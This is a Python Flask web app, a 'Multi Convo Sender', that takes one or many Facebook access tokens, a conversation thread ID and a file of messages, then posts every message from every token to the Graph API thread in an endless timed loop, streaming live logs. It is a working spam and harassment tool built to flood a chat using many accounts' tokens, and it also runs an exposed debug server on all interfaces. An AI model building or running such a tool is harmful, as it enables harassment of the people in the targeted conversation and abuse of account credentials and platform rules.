from flask import Flask, request, render_template_string, Response
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

stop_events = {}
threads = {}
message_logs = {}   # har task ka live log store hoga

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    message_logs[task_id] = []
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)

                if response.status_code == 200:
                    log = f"✅ Sent from {access_token[:6]}...: {message}"
                else:
                    log = f"❌ Failed from {access_token[:6]}...: {message}"

                message_logs[task_id].append(log)
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

        stop_events[task_id] = Event()
        threads[task_id] = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id].start()

        return f'Task started with ID: {task_id} <br> <a href="/logs/{task_id}">View Live Logs</a>'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Live Multi Convo</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background: black; color: white; text-align: center; }
    .container { max-width: 400px; margin-top: 40px; }
    .log-box {
      background: #111;
      border: 1px solid #444;
      padding: 10px;
      height: 250px;
      overflow-y: scroll;
      text-align: left;
      font-size: 14px;
      white-space: pre-line;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🔥 Multi Convo Sender 🔥</h2>
    <form method="post" enctype="multipart/form-data">
      <select class="form-control mb-2" name="tokenOption" onchange="toggleTokenInput()">
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>
      <input type="text" class="form-control mb-2" name="singleToken" id="singleTokenInput" placeholder="Enter Token">
      <input type="file" class="form-control mb-2" name="tokenFile" id="tokenFileInput" style="display:none;">
      <input type="text" class="form-control mb-2" name="threadId" placeholder="Thread ID" required>
      <input type="text" class="form-control mb-2" name="kidx" placeholder="Your Name" required>
      <input type="number" class="form-control mb-2" name="time" placeholder="Interval (sec)" required>
      <input type="file" class="form-control mb-2" name="txtFile" required>
      <button type="submit" class="btn btn-danger w-100">🚀 Start</button>
    </form>
  </div>
  <script>
    function toggleTokenInput() {
      let opt = document.querySelector("select[name=tokenOption]").value;
      document.getElementById("singleTokenInput").style.display = (opt === "single") ? "block" : "none";
      document.getElementById("tokenFileInput").style.display = (opt === "multiple") ? "block" : "none";
    }
  </script>
</body>
</html>
''')

@app.route('/logs/<task_id>')
def logs(task_id):
    def event_stream():
        last_index = 0
        while not stop_events.get(task_id, Event()).is_set():
            logs = message_logs.get(task_id, [])
            if last_index < len(logs):
                for log in logs[last_index:]:
                    yield f"data: {log}\n\n"
                last_index = len(logs)
            time.sleep(1)
    return Response(event_stream(), mimetype="text/event-stream")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, threaded=True)
